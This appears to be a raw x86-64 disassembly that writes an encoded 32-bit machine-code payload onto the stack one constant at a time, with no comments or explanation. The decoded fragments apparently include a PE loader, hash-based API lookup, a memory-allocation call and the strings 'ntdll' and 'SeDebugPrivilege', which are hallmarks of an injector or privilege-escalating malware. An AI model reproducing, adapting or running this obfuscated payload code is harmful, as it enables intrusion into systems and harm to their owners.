mov [ rsp + 0x4c ] 0xc1b60f00
mov [ rsp + 0x15c ] ecx
mov [ rsp + 0x160 ] eax
mov [ rsp + 0x50 ] 0xc108e0c1
mov [ rsp + 0x54 ] 0xc10b08e9
mov [ rsp + 0x58 ] 0x59086ac3
mov [ rsp + 0x5c ] 0xc3c0d366
mov [ rsp + 0x60 ] 0x424448d
mov [ rsp + 0x64 ] 0x8b04e883
mov [ rsp + 0x68 ] 0x5e88300
mov [ rsp + 0x6c ] 0x33f63356
mov [ rsp + 0x70 ] 0x81d08bc9
mov [ rsp + 0x74 ] 0x4c47423a
mov [ rsp + 0x78 ] 0x8505754d
mov [ rsp + 0x7c ] 0x461175f6
mov [ rsp + 0x80 ] 0xf9814a41
mov [ rsp + 0x84 ] 0x7d0
mov [ rsp + 0x88 ] 0xc033e97c
mov [ rsp + 0x8c ] 0x4c25e
mov [ rsp + 0x90 ] 0xf8ebc12b
mov [ rsp + 0x98 ] 0x75ff5753
mov [ rsp + 0x9c ] 0x57ff3308
mov [ rsp + 0xa0 ] 0x401a30bb
mov [ rsp + 0xa4 ] 0xffff6800
mov [ rsp + 0xa8 ] 0xeb81001f
mov [ rsp + 0xb0 ] 0x8896ff
mov [ rsp + 0xb4 ] 0x45890000
mov [ rsp + 0xb8 ] 0x74c73b08
mov [ rsp + 0xbc ] 0x68406a59
mov [ rsp + 0xc0 ] 0x1000
mov [ rsp + 0xc4 ] 0xff505753
mov [ rsp + 0xc8 ] 0x45896c56
mov [ rsp + 0xcc ] 0x74c73bfc
mov [ rsp + 0xd0 ] 0xff53573f
mov [ rsp + 0xd4 ] 0xff502076
mov [ rsp + 0xd8 ] 0x96ff0875
mov [ rsp + 0xdc ] 0x84
mov [ rsp + 0xe0 ] 0x68046a
mov [ rsp + 0xe4 ] 0x68000010
mov [ rsp + 0xe8 ] 0xd0
mov [ rsp + 0xec ] 0x875ff57
mov [ rsp + 0xf0 ] 0x576c56ff
mov [ rsp + 0xf4 ] 0xe4b85057
mov [ rsp + 0xf8 ] 0x2d004015
mov [ rsp + 0x100 ] 0x50fc4503
mov [ rsp + 0x104 ] 0x75ff5757
mov [ rsp + 0x108 ] 0x7856ff08
mov [ rsp + 0x10c ] 0x4056ff50
mov [ rsp + 0x110 ] 0xff0875ff
mov [ rsp + 0x114 ] 0x5b5f4056
mov [ rsp + 0x118 ] 0x4c2c9
mov [ rsp + 0x120 ] 0xfc6583
mov [ rsp + 0x124 ] 0x205d8b53
mov [ rsp + 0x128 ] 0xe8535756
mov [ rsp + 0x12c ] 0xffffff30
mov [ rsp + 0x130 ] 0xf604708b
mov [ rsp + 0x134 ] 0xa7504c3
mov [ rsp + 0x138 ] 0xc704cb83
mov [ rsp + 0x13c ] 0x1fc45
mov [ rsp + 0x140 ] 0x75ff0000
mov [ rsp + 0x144 ] 0x307d8b34
mov [ rsp + 0x148 ] 0x2c75ff57
mov [ rsp + 0x14c ] 0xff2875ff
mov [ rsp + 0x150 ] 0xff532475
mov [ rsp + 0x154 ] 0x75ff1c75
mov [ rsp + 0x158 ] edx
mov [ rsp + 0x164 ] 0x2456ff08
mov [ rsp + 0x168 ] 0x8b0877ff
mov [ rsp + 0x16c ] 0xff22e8d8
mov [ rsp + 0x170 ] 0x7d83ffff
mov [ rsp + 0x174 ] 0x67501fc
mov [ rsp + 0x178 ] 0xff0477ff
mov [ rsp + 0x17c ] 0x5e5f7c56
mov [ rsp + 0x180 ] 0xc95bc38b
mov [ rsp + 0x184 ] 0x550030c2
mov [ rsp + 0x188 ] 0x8351ec8b
mov [ rsp + 0x18c ] 0x5300fc65
mov [ rsp + 0x190 ] 0x56205d8b
mov [ rsp + 0x194 ] 0xc5e85357
mov [ rsp + 0x198 ] 0x8bfffffe
mov [ rsp + 0x19c ] 0xc3f60470
mov [ rsp + 0x1a0 ] 0x830a7504
mov [ rsp + 0x1a4 ] 0x45c704cb
mov [ rsp + 0x1a8 ] 0x1fc
mov [ rsp + 0x1ac ] 0x3475ff00
mov [ rsp + 0x1b0 ] 0x57307d8b
mov [ rsp + 0x1b4 ] 0xff2c75ff
mov [ rsp + 0x1b8 ] 0x75ff2875
mov [ rsp + 0x1bc ] 0x75ff5324
mov [ rsp + 0x1c0 ] 0x1875ff1c
mov [ rsp + 0x1c4 ] 0xff1475ff
mov [ rsp + 0x1c8 ] 0x75ff1075
mov [ rsp + 0x1cc ] 0x875ff0c
mov [ rsp + 0x1d0 ] 0xff2856ff
mov [ rsp + 0x1d4 ] 0xd88b0877
mov [ rsp + 0x1d8 ] 0xfffeb7e8
mov [ rsp + 0x1dc ] 0xfc7d83ff
mov [ rsp + 0x1e0 ] 0x68117501
mov [ rsp + 0x1e4 ] 0xc8
mov [ rsp + 0x1e8 ] 0xc096ff
mov [ rsp + 0x1ec ] 0x77ff0000
mov [ rsp + 0x1f0 ] 0x7c56ff04
mov [ rsp + 0x1f4 ] 0xc38b5e5f
mov [ rsp + 0x1f8 ] 0x30c2c95b
mov [ rsp + 0x1fc ] 0xec8b5500
mov [ rsp + 0x200 ] 0xfc658351
mov [ rsp + 0x204 ] 0x57565300
mov [ rsp + 0x208 ] 0x458bf88b
mov [ rsp + 0x20c ] 0xe830ff0c
mov [ rsp + 0x210 ] 0xfffffe4c
mov [ rsp + 0x214 ] 0x8b04588b
mov [ rsp + 0x218 ] 0x708d0845
mov [ rsp + 0x21c ] 0x8d0e8b01
mov [ rsp + 0x220 ] 0x8b050144
mov [ rsp + 0x224 ] 0x1890c4d
mov [ rsp + 0x228 ] 0x50fc458d
mov [ rsp + 0x22c ] 0x46a406a
mov [ rsp + 0x230 ] 0x7453ff56
mov [ rsp + 0x234 ] 0x8d087d2b
mov [ rsp + 0x238 ] 0xff50fc45
mov [ rsp + 0x23c ] 0xef83fc75
mov [ rsp + 0x240 ] 0x56046a05
mov [ rsp + 0x244 ] 0x53ff3e89
mov [ rsp + 0x248 ] 0x5b5e5f74
mov [ rsp + 0x24c ] 0x8c2c9
mov [ rsp + 0x250 ] 0x83ec8b55
mov [ rsp + 0x254 ] 0x428b10ec
mov [ rsp + 0x258 ] 0x10448b3c
mov [ rsp + 0x25c ] 0xfc658378
mov [ rsp + 0x260 ] 0xc2035300
mov [ rsp + 0x264 ] 0x8b20488b
mov [ rsp + 0x268 ] 0x57561c58
mov [ rsp + 0x26c ] 0x8b24788b
mov [ rsp + 0x270 ] 0xca031840
mov [ rsp + 0x274 ] 0xda03fa03
mov [ rsp + 0x278 ] 0x85f04589
mov [ rsp + 0x27c ] 0x8b4276c0
mov [ rsp + 0x280 ] 0x348bfc45
mov [ rsp + 0x284 ] 0xf4658381
mov [ rsp + 0x288 ] 0x8af20300
mov [ rsp + 0x28c ] 0x74c08406
mov [ rsp + 0x290 ] 0xf875891d
mov [ rsp + 0x294 ] 0xff4758b
mov [ rsp + 0x298 ] 0xcec1c0be
mov [ rsp + 0x29c ] 0xfff00307
mov [ rsp + 0x2a0 ] 0x458bf845
mov [ rsp + 0x2a4 ] 0x89008af8
mov [ rsp + 0x2a8 ] 0xc084f475
mov [ rsp + 0x2ac ] 0x458be675
mov [ rsp + 0x2b0 ] 0x8453bf4
mov [ rsp + 0x2b4 ] 0x45ff1274
mov [ rsp + 0x304 ] eax
mov eax 0x850f0000
mov r13d 0xfc085f1
mov edi 0x8578d00
mov ebx 0x4a8bf08b
mov [ rsp + 0x2fc ] edx
mov [ rsp + 0x334 ] eax
mov [ rsp + 0x358 ] eax
mov [ rsp + 0x300 ] ecx
mov eax 0x8428904
mov r11d 0x4d8bffff
mov r10d 0x9b70f1c
mov r9d 0x1075c13b
mov r8d 0x4289c033
mov edx 0xfc4289f8
mov ecx 0x42890289
mov [ rsp + 0x3a0 ] eax
mov [ rsp + 0x2b8 ] 0xfc458bfc
mov [ rsp + 0x2bc ] 0x72f0453b
mov [ rsp + 0x2c0 ] 0x5fc033be
mov [ rsp + 0x2c4 ] 0xc3c95b5e
mov [ rsp + 0x2c8 ] 0xffc458b
mov [ rsp + 0x2cc ] 0x8b4704b7
mov [ rsp + 0x2d0 ] 0xc2038304
mov [ rsp + 0x2d4 ] 0x8b55edeb
mov [ rsp + 0x2d8 ] 0x5d8b53ec
mov [ rsp + 0x2dc ] 0x5357561c
mov [ rsp + 0x2e0 ] 0xfffd7be8
mov [ rsp + 0x2e4 ] 0x2c75ffff
mov [ rsp + 0x2e8 ] 0x8b287d8b
mov [ rsp + 0x2ec ] 0x408b2075
mov [ rsp + 0x2f0 ] 0x75ff5704
mov [ rsp + 0x2f4 ] 0x1c458924
mov [ rsp + 0x2f8 ] 0x75ff5356
mov [ rsp + 0x308 ] 0xbc90ff08
mov [ rsp + 0x30c ] 0x89000000
mov [ rsp + 0x310 ] 0xc0852845
mov [ rsp + 0x314 ] 0x1a68c0f
mov [ rsp + 0x318 ] 0xfb810000
mov [ rsp + 0x31c ] 0x120003
mov [ rsp + 0x320 ] 0x123850f
mov [ rsp + 0x324 ] 0x7d830000
mov [ rsp + 0x328 ] 0x850f2424
mov [ rsp + 0x32c ] 0x190
mov [ rsp + 0x330 ] 0x4003e81
mov [ rsp + 0x338 ] 0x184
mov [ rsp + 0x33c ] 0x47e83
mov [ rsp + 0x340 ] 0x17a850f
mov [ rsp + 0x344 ] 0x7e810000
mov [ rsp + 0x348 ] 0x20008
mov [ rsp + 0x34c ] 0x6d850f00
mov [ rsp + 0x350 ] 0x81000001
mov [ rsp + 0x354 ] 0x1000c7e
mov [ rsp + 0x35c ] 0x160
mov [ rsp + 0x360 ] 0x8110768b
mov [ rsp + 0x364 ] 0x101fe
mov [ rsp + 0x368 ] 0x8b447500
mov [ rsp + 0x36c ] 0x146a2c45
mov [ rsp + 0x370 ] 0xf759d233
mov [ rsp + 0x374 ] r13d
mov [ rsp + 0x378 ] 0x14386
mov [ rsp + 0x37c ] edi
mov [ rsp + 0x380 ] ebx
mov [ rsp + 0x384 ] 0xfcc3e808
mov [ rsp + 0x388 ] r11d
mov [ rsp + 0x38c ] r10d
mov [ rsp + 0x390 ] r9d
mov [ rsp + 0x394 ] r8d
mov [ rsp + 0x398 ] edx
mov [ rsp + 0x39c ] ecx
mov [ rsp + 0x3a4 ] 0x4e14c283
mov [ rsp + 0x3a8 ] 0x11e9d875
mov [ rsp + 0x3ac ] 0x81000001
mov [ rsp + 0x3b0 ] 0x102fe
mov [ rsp + 0x3b4 ] 0x8b447500
mov [ rsp + 0x3b8 ] 0x186a2c45
mov [ rsp + 0x3bc ] 0xf759d233
mov [ rsp + 0x3c0 ] r13d
mov [ rsp + 0x3c4 ] 0xf786
mov [ rsp + 0x3c8 ] edi
mov [ rsp + 0x3cc ] ebx
mov ebx 0x8b000000
mov edi 0x8d000000
mov [ rsp + 0x3d0 ] 0xfc77e808
mov [ rsp + 0x3d4 ] r11d
mov [ rsp + 0x3d8 ] r10d
mov [ rsp + 0x3dc ] r9d
mov [ rsp + 0x404 ] ebx
mov [ rsp + 0x418 ] edi
mov [ rsp + 0x3e0 ] r8d
mov [ rsp + 0x3e4 ] edx
mov [ rsp + 0x3e8 ] ecx
mov [ rsp + 0x3ec ] eax
mov [ rsp + 0x3f0 ] 0x4e18c283
mov [ rsp + 0x3f4 ] 0xc5e9d875
mov [ rsp + 0x3f8 ] 0x81000000
mov [ rsp + 0x3fc ] 0x110fe
mov [ rsp + 0x400 ] 0xb9850f00
mov [ rsp + 0x408 ] 0xc6832c45
mov [ rsp + 0x40c ] 0x8bd23398
mov [ rsp + 0x410 ] 0x85f1f7ce
mov [ rsp + 0x414 ] 0xa5860fc0
mov [ rsp + 0x41c ] 0xf88b0857
mov [ rsp + 0x420 ] 0xe80c4a8b
mov [ rsp + 0x424 ] 0xfffffc25
mov [ rsp + 0x428 ] 0xf1c4d8b
mov [ rsp + 0x42c ] 0xc13b09b7
mov [ rsp + 0x430 ] 0xc0331075
mov [ rsp + 0x434 ] 0x89fc4289
mov [ rsp + 0x438 ] 0x4428902
mov [ rsp + 0x43c ] 0x89084289
mov [ rsp + 0x440 ] 0xd6030c42
mov [ rsp + 0x444 ] 0xebd9754f
mov [ rsp + 0x448 ] 0x1bfb8177
mov [ rsp + 0x44c ] 0x75001200
mov [ rsp + 0x450 ] 0x247d836f
mov [ rsp + 0x454 ] 0x8369753c
mov [ rsp + 0x458 ] 0x75030c7e
mov [ rsp + 0x45c ] 0x107e8363
mov [ rsp + 0x460 ] 0x835d7501
mov [ rsp + 0x464 ] 0x7501147e
mov [ rsp + 0x468 ] 0x1c7e8357
mov [ rsp + 0x46c ] 0x8b517538
mov [ rsp + 0x470 ] 0x7f8b3847
mov [ rsp + 0x474 ] 0x76c08518
mov [ rsp + 0x478 ] 0x2578d47
mov [ rsp + 0x47c ] 0x8b66f08b
mov [ rsp + 0x480 ] 0xd2e81c42
mov [ rsp + 0x484 ] 0x8bfffffb
mov [ rsp + 0x488 ] 0x3b661c4d
mov [ rsp + 0x48c ] 0x332b7501
mov [ rsp + 0x490 ] 0x890289c0
mov [ rsp + 0x494 ] 0x42890242
mov [ rsp + 0x498 ] 0xa428906
mov [ rsp + 0x49c ] 0x890e4289
mov [ rsp + 0x4a0 ] 0x42891242
mov [ rsp + 0x4a4 ] 0x1a428916
mov [ rsp + 0x4a8 ] 0x891e4289
mov [ rsp + 0x4ac ] 0x42892242
mov [ rsp + 0x4b0 ] 0x2a428926
mov [ rsp + 0x4b4 ] 0x892e4289
mov [ rsp + 0x4b8 ] 0xc2833242
mov [ rsp + 0x4bc ] 0xbe754e38
mov [ rsp + 0x4c0 ] 0x5f28458b
mov [ rsp + 0x4c4 ] 0xc25d5b5e
mov [ rsp + 0x4c8 ] 0x8b550028
mov [ rsp + 0x4cc ] 0x40ec81ec
mov [ rsp + 0x4d0 ] 0x53000004
mov [ rsp + 0x4d4 ] 0xa496ff57
mov [ rsp + 0x4d8 ] 0x50000000
mov [ rsp + 0x4dc ] 0x56ff086a
mov [ rsp + 0x4e0 ] 0xfc458948
mov [ rsp + 0x4e4 ] 0x840fc085
mov [ rsp + 0x4e8 ] 0xbc
mov [ rsp + 0x4ec ] 0xfbc0858d
mov [ rsp + 0x4f0 ] 0xff50ffff
mov [ rsp + 0x4f4 ] 0x85c7fc75
mov [ rsp + 0x4f8 ] 0xfffffbc0
mov [ rsp + 0x4fc ] 0x428
mov [ rsp + 0x500 ] 0xe94c56ff
mov [ rsp + 0x504 ] 0x92
mov [ rsp + 0x508 ] 0xfbd48d8b
mov ecx 0x4689ffff
mov [ rsp + 0x50c ] 0x418bffff
mov [ rsp + 0x510 ] 0x8848b3c
mov [ rsp + 0x514 ] 0x80
mov [ rsp + 0x518 ] 0x7883c103
mov [ rsp + 0x51c ] 0x4d89000c
mov [ rsp + 0x638 ] ecx
mov [ rsp + 0x520 ] 0x836a74ec
mov [ rsp + 0x524 ] 0x458910c0
mov [ rsp + 0x528 ] 0x85188bf0
mov [ rsp + 0x52c ] 0x8b5e74db
mov [ rsp + 0x530 ] 0x6583ec4d
mov [ rsp + 0x534 ] 0xd90300f8
mov [ rsp + 0x538 ] 0x74003b83
mov [ rsp + 0x53c ] 0x8bfb8b44
mov [ rsp + 0x540 ] 0xbc8e3b0f
mov [ rsp + 0x544 ] 0x75000000
mov [ rsp + 0x548 ] 0xf465832a
mov [ rsp + 0x54c ] 0xf4458d00
mov [ rsp + 0x550 ] 0x6a406a50
mov [ rsp + 0x554 ] 0x56ff5704
mov [ rsp + 0x558 ] 0x1c468b74
mov [ rsp + 0x55c ] 0x4012dc05
mov [ rsp + 0x560 ] 0x8d078900
mov [ rsp + 0x564 ] 0xff50f445
mov [ rsp + 0x568 ] 0x46af475
mov [ rsp + 0x56c ] 0x7456ff57
mov [ rsp + 0x570 ] 0xfff0458b
mov [ rsp + 0x574 ] 0x4d8bf845
mov [ rsp + 0x578 ] 0x8b3c8df8
mov [ rsp + 0x57c ] 0x75003f83
mov [ rsp + 0x580 ] 0x14c083be
mov [ rsp + 0x584 ] 0xfc7883
mov [ rsp + 0x588 ] 0x75f04589
mov [ rsp + 0x58c ] 0xc0858d9c
mov [ rsp + 0x590 ] 0x50fffffb
mov [ rsp + 0x594 ] 0xfffc75ff
mov [ rsp + 0x598 ] 0xc0855056
mov [ rsp + 0x59c ] 0xff66850f
mov [ rsp + 0x5a0 ] 0x75ffffff
mov [ rsp + 0x5a4 ] 0x4056fffc
mov [ rsp + 0x5a8 ] 0xc3c95b5f
mov [ rsp + 0x5ac ] 0x5a4db9
mov [ rsp + 0x5b0 ] 0x8396600
mov [ rsp + 0x5b4 ] 0x488b1575
mov [ rsp + 0x5b8 ] 0xf9813c
mov [ rsp + 0x5bc ] 0x7d000010
mov [ rsp + 0x5c0 ] 0x13c810a
mov [ rsp + 0x5c4 ] 0x4550
mov [ rsp + 0x5c8 ] 0x48c3e275
mov [ rsp + 0x5cc ] 0x81c8b70f
mov [ rsp + 0x5d0 ] 0xfffff9
mov [ rsp + 0x5d4 ] 0x25d57500
mov [ rsp + 0x5d8 ] 0xffff0000
mov [ rsp + 0x5dc ] 0x8b55ceeb
mov [ rsp + 0x5e0 ] 0xf8e483ec
mov [ rsp + 0x5e4 ] 0x533cec83
mov [ rsp + 0x5e8 ] 0x8758b56
mov [ rsp + 0x5ec ] 0x1876ff57
mov [ rsp + 0x5f0 ] 0xe8207e8d
mov [ rsp + 0x5f4 ] 0xfffffa68
mov [ rsp + 0x5f8 ] 0x462d0789
mov [ rsp + 0x5fc ] 0x89004010
mov [ rsp + 0x600 ] 0x78b1c46
mov [ rsp + 0x604 ] 0x8b047089
mov [ rsp + 0x608 ] 0x408b6607
mov [ rsp + 0x60c ] 0x6896608
mov [ rsp + 0x610 ] 0x8308458d
mov [ rsp + 0x614 ] 0x8b04e8
mov [ rsp + 0x618 ] 0xffff8fe8
mov [ rsp + 0x61c ] 0x68d08bff
mov [ rsp + 0x620 ] 0xff0d6657
mov [ rsp + 0x624 ] 0xe8085689
mov [ rsp + 0x628 ] 0xfffffc24
mov [ rsp + 0x62c ] 0x32936859
mov [ rsp + 0x630 ] 0x468994e4
mov [ rsp + 0x634 ] 0xfc16e840
mov [ rsp + 0x63c ] 0x2404c734
mov [ rsp + 0x640 ] 0x130f36b2
mov [ rsp + 0x644 ] 0xfffc07e8
mov [ rsp + 0x648 ] 0x384689ff
mov eax 0x89fffffb
mov r10d 0xc7000000
mov r8d 0x2404c700
mov r9d 0x59fffffa
mov r11d 0x8689ffff
mov [ rsp + 0x64c ] 0xc42404c7
mov [ rsp + 0x680 ] eax
mov [ rsp + 0x728 ] r10d
mov [ rsp + 0x734 ] eax
mov [ rsp + 0x73c ] r8d
mov [ rsp + 0x754 ] r9d
mov [ rsp + 0x774 ] r11d
mov [ rsp + 0x650 ] 0xe8741f8d
mov [ rsp + 0x654 ] 0xfffffbf8
mov [ rsp + 0x658 ] 0xbe436859
mov [ rsp + 0x65c ] 0x4689dbac
mov [ rsp + 0x660 ] 0xfbeae83c
mov [ rsp + 0x664 ] ecx
mov [ rsp + 0x668 ] 0x2404c744
mov [ rsp + 0x66c ] 0x3cc0153d
mov [ rsp + 0x670 ] 0xfffbdbe8
mov [ rsp + 0x674 ] 0xa66859ff
mov [ rsp + 0x678 ] 0x89c4446a
mov [ rsp + 0x67c ] 0xcde84846
mov [ rsp + 0x684 ] 0x4c75446
mov [ rsp + 0x688 ] 0x25596324
mov [ rsp + 0x68c ] 0xfbbee82e
mov [ rsp + 0x690 ] ecx
mov [ rsp + 0x694 ] 0x2404c758
mov [ rsp + 0x698 ] 0x2eea7
mov [ rsp + 0x69c ] 0xfffbafe8
mov [ rsp + 0x6a0 ] 0x5c4689ff
mov [ rsp + 0x6a4 ] 0x812404c7
mov [ rsp + 0x6a8 ] 0xe80d6759
mov [ rsp + 0x6ac ] 0xfffffba0
mov [ rsp + 0x6b0 ] 0x9c66859
mov [ rsp + 0x6b4 ] 0x4689c83b
mov [ rsp + 0x6b8 ] 0xfb92e860
mov [ rsp + 0x6bc ] ecx
mov [ rsp + 0x6c0 ] 0x2404c74c
mov [ rsp + 0x6c4 ] 0x2974e965
mov [ rsp + 0x6c8 ] 0xfffb83e8
mov [ rsp + 0x6cc ] 0x504689ff
mov [ rsp + 0x6d0 ] 0x672404c7
mov [ rsp + 0x6d4 ] 0xe81ede59
mov [ rsp + 0x6d8 ] 0xfffffb74
mov [ rsp + 0x6dc ] 0x7bf16859
mov [ rsp + 0x6e0 ] 0x4689ef9c
mov [ rsp + 0x6e4 ] 0xfb66e868
mov [ rsp + 0x6e8 ] ecx
mov [ rsp + 0x6ec ] 0x2404c76c
mov [ rsp + 0x6f0 ] 0x6144aa05
mov [ rsp + 0x6f4 ] 0xfffb57e8
mov [ rsp + 0x6f8 ] 0x704689ff
mov [ rsp + 0x6fc ] 0x7d2404c7
mov [ rsp + 0x700 ] 0xe824c2a2
mov [ rsp + 0x704 ] 0xfffffb48
mov [ rsp + 0x708 ] 0xa41e6859
mov [ rsp + 0x70c ] 0x4689ef64
mov [ rsp + 0x710 ] 0xfb3ae864
mov [ rsp + 0x714 ] ecx
mov [ rsp + 0x718 ] 0x2404c774
mov [ rsp + 0x71c ] 0x6c3d8815
mov [ rsp + 0x720 ] 0xfffb2be8
mov [ rsp + 0x724 ] 0x908689ff
mov [ rsp + 0x72c ] 0xa4832404
mov [ rsp + 0x730 ] 0x19e8318b
mov [ rsp + 0x738 ] 0x9486
mov [ rsp + 0x740 ] 0x669aeb63
mov [ rsp + 0x744 ] 0xfffb07e8
mov [ rsp + 0x748 ] 0xd66859ff
mov [ rsp + 0x74c ] 0x89f39e8c
mov [ rsp + 0x750 ] 0xf9e87846
mov [ rsp + 0x758 ] 0x20613368
mov [ rsp + 0x75c ] 0x7c4689d5
mov [ rsp + 0x760 ] 0xfffaebe8
mov [ rsp + 0x764 ] 0x586859ff
mov [ rsp + 0x768 ] 0x8997410f
mov [ rsp + 0x76c ] 0x8086
mov [ rsp + 0x770 ] 0xfadae800
mov [ rsp + 0x778 ] 0x84
mov edx 0x4c70000
mov ecx 0x89fffffa
mov eax 0x6859ffff
mov [ rsp + 0x7e0 ] r8d
mov [ rsp + 0x78c ] edx
mov [ rsp + 0x814 ] edx
mov edx 0x46890000
mov r8d 0xa896ff
mov [ rsp + 0x77c ] 0x532404c7
mov [ rsp + 0x780 ] 0xe877ce85
mov [ rsp + 0x784 ] 0xfffffac8
mov [ rsp + 0x788 ] 0x888689
mov [ rsp + 0x8a4 ] edx
mov [ rsp + 0x790 ] 0x4a878d24
mov [ rsp + 0x794 ] 0xfab6e85f
mov [ rsp + 0x798 ] r11d
mov [ rsp + 0x79c ] 0x8c
mov [ rsp + 0x7a0 ] 0xc92404c7
mov [ rsp + 0x7a4 ] 0xe86ba6bc
mov [ rsp + 0x7a8 ] 0xfffffaa4
mov [ rsp + 0x7ac ] 0xc72c4689
mov [ rsp + 0x7b0 ] 0xbcdf2404
mov [ rsp + 0x7b4 ] 0x95e86ba6
mov [ rsp + 0x7b8 ] ecx
mov [ rsp + 0x7bc ] 0x4c73046
mov [ rsp + 0x7c0 ] 0x7f310b24
mov [ rsp + 0x7c4 ] 0xfa86e833
mov [ rsp + 0x7c8 ] eax
mov [ rsp + 0x7cc ] 0x8e6902b2
mov [ rsp + 0x7d0 ] 0x988689
mov [ rsp + 0x7d4 ] 0x75e80000
mov [ rsp + 0x7d8 ] ecx
mov [ rsp + 0x7dc ] 0x9c86
mov [ rsp + 0x7e4 ] 0xb483154
mov [ rsp + 0x7e8 ] 0xfffa63e8
mov [ rsp + 0x7ec ] 0xa08689ff
mov [ rsp + 0x7f0 ] r10d
mov [ rsp + 0x7f4 ] 0xe9242404
mov [ rsp + 0x7f8 ] 0x51e82cec
mov [ rsp + 0x7fc ] r9d
mov [ rsp + 0x800 ] 0xe2f2b268
mov [ rsp + 0x804 ] 0xa48689f4
mov [ rsp + 0x808 ] 0xe8000000
mov [ rsp + 0x80c ] 0xfffffa40
mov [ rsp + 0x810 ] 0xa88689
mov [ rsp + 0x818 ] 0x91743224
mov [ rsp + 0x81c ] 0xfa2ee80c
mov [ rsp + 0x820 ] eax
mov [ rsp + 0x824 ] 0xcb9765a0
mov [ rsp + 0x828 ] 0xac8689
mov [ rsp + 0x82c ] 0x1de80000
mov [ rsp + 0x830 ] ecx
mov [ rsp + 0x834 ] 0xc086
mov [ rsp + 0x838 ] 0x4e8b5900
mov [ rsp + 0x83c ] 0x33db332c
mov [ rsp + 0x840 ] 0x13c80c0
mov [ rsp + 0x844 ] 0x400874e8
mov [ rsp + 0x848 ] 0x7c64f883
mov [ rsp + 0x84c ] 0x8903ebf4
mov [ rsp + 0x850 ] 0x448d0446
mov [ rsp + 0x854 ] 0xc6501824
mov [ rsp + 0x858 ] 0x6e142444
mov [ rsp + 0x85c ] 0x152444c6
mov [ rsp + 0x860 ] 0x2444c674
mov [ rsp + 0x864 ] 0x44c66416
mov [ rsp + 0x868 ] 0xc66c1724
mov [ rsp + 0x86c ] 0x6c182444
mov [ rsp + 0x870 ] 0x19245c88
mov [ rsp + 0x874 ] 0x1c2444c6
mov [ rsp + 0x878 ] 0x2444c641
mov [ rsp + 0x87c ] 0x44c6641d
mov [ rsp + 0x880 ] 0xc6761e24
mov [ rsp + 0x884 ] 0x611f2444
mov [ rsp + 0x888 ] 0x202444c6
mov [ rsp + 0x88c ] 0x2444c670
mov [ rsp + 0x890 ] 0x44c66921
mov [ rsp + 0x894 ] 0xc6332224
mov [ rsp + 0x898 ] 0x32232444
mov [ rsp + 0x89c ] 0x24245c88
mov [ rsp + 0x8a0 ] r8d
mov [ rsp + 0x8a8 ] 0x75c33b14
mov eax 0xac
mov ecx 0x24448d0e
mov [ rsp + 0x8b0 ] 0x96ff5018
mov [ rsp + 0x8ac ] ecx
mov [ rsp + 0x8cc ] ecx
lea ecx [ rax + 0x1c ]
mov [ rsp + 0x8b4 ] eax
mov [ rsp + 0x8d4 ] eax
mov eax 0x2444c667
mov [ rsp + 0x914 ] ecx
mov [ rsp + 0x9bc ] ecx
mov [ rsp + 0x8b8 ] 0x8d144689
mov [ rsp + 0x8bc ] 0x50102444
mov [ rsp + 0x8c0 ] r8d
mov [ rsp + 0x8c4 ] edx
mov [ rsp + 0x8c8 ] 0x75c33b10
mov [ rsp + 0x8d0 ] 0x96ff5010
mov [ rsp + 0x8d8 ] 0x8b104689
mov [ rsp + 0x8dc ] 0xdf681056
mov [ rsp + 0x8e0 ] 0xe898740d
mov [ rsp + 0x8e4 ] 0xfffff968
mov [ rsp + 0x8e8 ] 0xbc8689
mov [ rsp + 0x8ec ] 0x568b0000
mov [ rsp + 0x8f0 ] 0x2404c714
mov [ rsp + 0x8f4 ] 0x3aa94e59
mov [ rsp + 0x8f8 ] 0xfff953e8
mov [ rsp + 0x8fc ] 0xc48689ff
mov [ rsp + 0x900 ] ebx
mov [ rsp + 0x904 ] 0x4c71456
mov [ rsp + 0x908 ] 0x37c24a24
mov [ rsp + 0x90c ] 0xf93ee802
mov [ rsp + 0x910 ] r11d
mov [ rsp + 0x918 ] 0xc714568b
mov [ rsp + 0x91c ] 0xcb832404
mov [ rsp + 0x920 ] 0x29e82306
mov [ rsp + 0x924 ] 0x59fffff9
mov [ rsp + 0x928 ] 0xcc8689
mov [ rsp + 0x92c ] 0x448d0000
mov [ rsp + 0x930 ] 0x68500c24
mov [ rsp + 0x934 ] 0xf01ff
mov [ rsp + 0x938 ] 0x5c89ff6a
mov [ rsp + 0x93c ] 0x96ff1824
mov [ rsp + 0x940 ] 0xc4
mov [ rsp + 0x944 ] 0x8547ff33
mov [ rsp + 0x948 ] 0x90840fc0
mov [ rsp + 0x94c ] edi
mov [ rsp + 0x950 ] 0x50282444
mov [ rsp + 0x954 ] 0x3824448d
mov [ rsp + 0x958 ] 0x7c895350
mov [ rsp + 0x95c ] 0x44c73024
mov [ rsp + 0x960 ] 0x23c24
mov [ rsp + 0x964 ] 0x44c60000
mov [ rsp + 0x968 ] 0xc6534024
mov [ rsp + 0x96c ] 0x65412444
mov [ rsp + 0x970 ] 0x422444c6
mov [ rsp + 0x974 ] 0x2444c644
mov [ rsp + 0x978 ] 0x44c66543
mov [ rsp + 0x97c ] 0xc6624424
mov [ rsp + 0x980 ] 0x75452444
mov [ rsp + 0x984 ] 0x462444c6
mov [ rsp + 0x988 ] eax
mov [ rsp + 0x98c ] 0x44c65047
mov [ rsp + 0x990 ] 0xc6724824
mov [ rsp + 0x994 ] 0x69492444
mov [ rsp + 0x998 ] 0x4a2444c6
mov [ rsp + 0x99c ] 0x2444c676
mov [ rsp + 0x9a0 ] 0x44c6694b
mov [ rsp + 0x9a4 ] 0xc66c4c24
mov [ rsp + 0x9a8 ] 0x654d2444
mov [ rsp + 0x9ac ] 0x4e2444c6
mov [ rsp + 0x9b0 ] eax
mov [ rsp + 0x9b4 ] 0x5c88654f
mov [ rsp + 0x9b8 ] 0x96ff5024
mov [ rsp + 0x9c0 ] 0x1474c085
mov [ rsp + 0x9c4 ] 0x106a5353
mov [ rsp + 0x9c8 ] 0x3024448d
mov [ rsp + 0x9cc ] 0x74ff5350
mov [ rsp + 0x9d0 ] 0x96ff2024
mov [ rsp + 0x9d4 ] 0xcc
mov [ rsp + 0x9d8 ] 0xc2474ff
mov [ rsp + 0x9dc ] 0x8b4056ff
mov eax 0x46030040
mov ecx 0x4e03044e
mov edi 0x9ec
mov [ rsp + 0x9ec ] eax
mov [ rsp + 0xa04 ] eax
movzx eax [ rsi ]
mov [ rsp + 0x9e0 ] ecx
mov [ rsp + 0x9f8 ] ecx
mov r9d 0x1000
mov r8 rdi
xor edx edx
mov rcx rbp
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x9e4 ] 0x24468d2c
